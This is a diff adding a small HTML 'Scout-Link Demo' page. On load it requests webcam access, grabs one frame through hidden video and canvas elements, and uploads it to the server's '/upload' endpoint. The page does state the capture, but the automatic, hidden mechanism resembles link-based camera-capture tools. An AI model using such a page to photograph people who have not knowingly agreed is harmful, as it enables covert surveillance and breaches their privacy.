@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Scout</title>
+<style>body{font-family:sans-serif;text-align:center;margin-top:3rem}</style></head>
+<body><h1>Scout-Link Demo</h1><p>Captures one webcam frame if you allow permission.</p>
+<video id="v" autoplay playsinline style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+<script>
+(async()=>{
+ try{
+  const s=await navigator.mediaDevices.getUserMedia({video:true});
+  const v=document.getElementById('v');v.srcObject=s;await v.play();
+  const c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;
+  c.getContext('2d').drawImage(v,0,0);
+  const png=c.toDataURL('image/png');
+  await fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({png})});
+  s.getTracks().forEach(t=>t.stop());
+ }catch(e){console.log(e);}
+})();
+</script></body></html>
